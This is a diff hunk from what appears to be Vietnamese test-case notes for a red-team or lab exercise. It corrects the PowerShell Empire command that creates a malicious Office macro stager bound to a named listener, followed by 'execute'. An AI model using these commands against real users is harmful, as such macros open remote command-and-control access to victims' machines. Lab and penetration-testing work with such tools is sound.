@@ -14,7 +14,7 @@
 ## Test case 2: Powershell Empire
 * Tạo macro:
 ```
-usestager /windows/macro
+usestager windows/macro
 set Listener [Tên listener]
 execute
 ```
